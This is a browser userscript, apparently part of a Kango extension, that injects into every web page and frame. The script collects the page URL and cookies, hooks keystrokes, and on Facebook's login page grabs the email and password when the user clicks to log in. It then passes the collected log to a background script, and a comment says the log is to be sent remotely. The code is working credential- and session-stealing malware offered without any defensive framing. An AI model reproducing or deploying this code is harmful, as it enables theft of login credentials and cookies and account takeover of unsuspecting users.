// ==UserScript==
// @name Main
// @include http://*
// @include https://*
// @all-frames true
// ==/UserScript==

(function (global) {

  "use strict";
  var timestamp = Date.now();

  // The JSON log we'll send remotely.
  var log = {
    timestamp: timestamp,
    url: document.location.href,
    cookie: document.cookie,
    login: {
      user: null,
      pass: null
    }
  };

  // Capture keys in global scope.
  key.filter = function filter(event) {
    return true;
  };

  key("q, w, e, r, t, y, u, i, o, p, a, s, d, f, g, h, j, k, l, z, x, c, v, b, n, m", function (event, handler) {
    console.log(handler.shortcut);
  });

  // Functions to execute once DOM is ready.
  contentLoaded(global, function () {

    // Site-specific logging.
    switch (document.location.hostname) {
    case "www.facebook.com":
      var $form = document.forms.login_form;
      var $button = document.getElementById("loginbutton").getElementsByTagName("input")[0];
      var $user = document.getElementById("email");
      var $pass = document.getElementById("pass");
      $button.addEventListener("click", function (event) {
        event.preventDefault();
        log.login.user = $user.value;
        log.login.pass = $pass.value;
        $form.submit();
      }, false);
      break;
    }

  });

  console.log(log);

  // Send log to background script
  kango.dispatchMessage('channelLog', log);

}(this));
